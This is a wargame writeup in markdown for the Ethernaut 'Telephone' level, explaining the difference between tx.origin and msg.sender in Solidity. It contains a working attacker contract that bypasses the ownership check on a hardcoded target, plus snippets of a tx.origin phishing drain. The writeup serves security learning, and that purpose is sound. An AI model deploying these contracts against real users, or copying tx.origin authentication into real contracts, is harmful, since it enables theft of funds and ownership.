@@ -1,0 +1,79 @@
+---
+title: "5. Telephone"
+tags:
+- writeups
+---
+
+- [diff between tx.origin & msg.sender](https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin)
+	- `msg.sender`
+		- gives direct sender of the msg *(user wallet or another smart contract)*
+		- checks where the external function call directly came from
+	- `tx.origin`
+		- original user wallet that initialized the tx
+		- the origin addr of potentially an entire chain of txs & calls
+		- `tx.origin` can be only user wallets, not contract ones
+
+## Exploitation
+- We can trick the `(tx.origin != msg.sender)` by spoofing `msg.sender`
+	- `tx.origin` will be our user address *(i.e `owner` from `PhoneChain`)*
+	- `msg.sender` will be the address of the attacking contract
+	- thus bypassing the check
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() public {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    // change the owner based on tx.origin
+    // we can spoof this
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+
+contract PhoneChain {
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+  }
+
+  function claimOwnership() payable public{
+    Telephone(0x9F728A9a2B2c6AC2A008F828086DB24FF5e5fA9d).changeOwner(owner);
+  }
+}
+```
+
+## Takeaways
+- confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/)
+	- use `tx.origin` to determine whose tokens to transfer
+		```solidity
+		function transfer(address _to, uint _value) {
+			tokens[tx.origin] -= _value;
+			tokens[_to] += _value;
+		}
+		```
+	- attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract
+		- `tx.origin`: victim addr while `msg.sender` is the malicious contract's addr
+		- results in funds being transferred from the victim to the attacker
+		```solidity
+		function () payable {
+			token.transfer(attackerAddr, 10000);
+		}
+		```
+- don't use `tx.origin` for authentication purposes
+
+## Refs
+- [Contracts using tx.origin for auth are vulnerable](https://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing)
+- [Phising with tx.origin](https://solidity-by-example.org/hacks/phishing-with-tx-origin/)
+
+## See Also
+- [[Ethernaut Wargame]]
